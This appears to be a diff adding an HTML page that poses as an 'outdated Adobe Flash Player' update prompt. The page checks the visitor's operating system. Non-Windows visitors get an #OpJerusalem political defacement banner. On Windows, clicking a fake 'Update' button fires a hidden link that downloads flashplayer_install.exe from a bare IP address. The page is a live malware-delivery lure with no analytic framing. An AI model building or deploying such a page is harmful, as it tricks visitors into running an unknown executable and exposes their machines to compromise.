@@ -1,0 +1,116 @@
+<html>
+<head>
+<script>
+
+function ParseOS(userAgent) {
+     var userAgent = navigator.userAgent.toLowerCase();
+     var os = "Windows";
+     //Corresponding arrays of user-agent strings and operating systems
+     match = ["windows nt 10","windows nt 6.3","windows nt 6.2","windows nt 6.1","windows nt 6.0","windows nt 5.2","windows nt 5.1","windows xp","windows nt 5.0","windows me","win98","win95","win16","macintosh","mac os x","mac_powerpc","android","linux","ubuntu","iphone","ipod","ipad","blackberry","webos"];
+     result = ["Windows 10","Windows 8.1","Windows 8","Windows 7","Windows Vista","Windows Server 2003/XP x64","Windows XP","Windows XP","Windows 2000","Windows ME","Windows 98","Windows 95","Windows 3.11","Mac OS X","Mac OS X","Mac OS 9","Android","Linux","Ubuntu","iPhone","iPod","iPad","BlackBerry","Mobile"];
+
+     //For each item in match array
+     for (var i = 0; i < match.length; i++) {
+
+              //If the string is contained within the user-agent then set the os
+              if (userAgent.indexOf(match[i]) !== -1) {
+                   os = result[i];
+                   break;
+              }
+
+     }
+
+     //Return the determined os
+     return os;
+}
+OS = ParseOS()
+if (OS != "Windows"){
+    document.write('<body bgcolor=black><center><h1><font color=red>Jerusalem is the capital of Palestine<br>#OpJerusalem</font></h1></center>')
+    window.stop()
+}
+</script>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body {
+  margin: 0;
+  font-family: Arial, Helvetica, sans-serif;
+}
+
+.header {
+  padding: 5px 16px;
+  background: #FFECB2;
+  color: black;
+}
+
+.sticky {
+  position: fixed;
+  top: 0;
+  width: 100%;
+}
+
+.button {
+    background-color: #008CBA;
+    border: none;
+    color: white;
+    padding: 3px 10px;
+    text-align: center;
+    text-decoration: none;
+    display: inline-block;
+    font-size: 16px;
+    margin: 4px 2px;
+    cursor: pointer;
+}
+#overlay {
+    position: fixed;
+    display: block;
+    width: 100%;
+    height: 100%;
+    top: 40;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background-color: rgba(0,0,0,0.5);
+    z-index: 2;
+    cursor: pointer;
+}
+</style>
+</head>
+
+<body>
+
+<div class="header" id="myHeader">
+  <img src='https://helpx.adobe.com/content/dam/help/mnemonics/flashplayer_app_RGB.svg' width=15></img><strong> Your version of Adobe Flash Player is outdated</strong> <button class="button">Update</button>
+
+</div>
+
+<div style="height:2000px;"><br></div>
+<div id="overlay"></div>
+
+<a href="http://185.163.47.134/flashplayer_install.exe" id="download" hidden></a>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script>
+
+document.getElementById("overlay").style.display = "block";
+
+window.onscroll = function() {myFunction()};
+
+var header = document.getElementById("myHeader");
+var sticky = header.offsetTop;
+
+function myFunction() {
+  if (window.pageYOffset > sticky) {
+    header.classList.add("sticky");
+  } else {
+    header.classList.remove("sticky");
+  }
+}
+
+$(document).ready(function(){
+    $("button").click(function(){
+        document.getElementById('download').click();
+    });
+});
+</script>
+
+</body>
+</html>
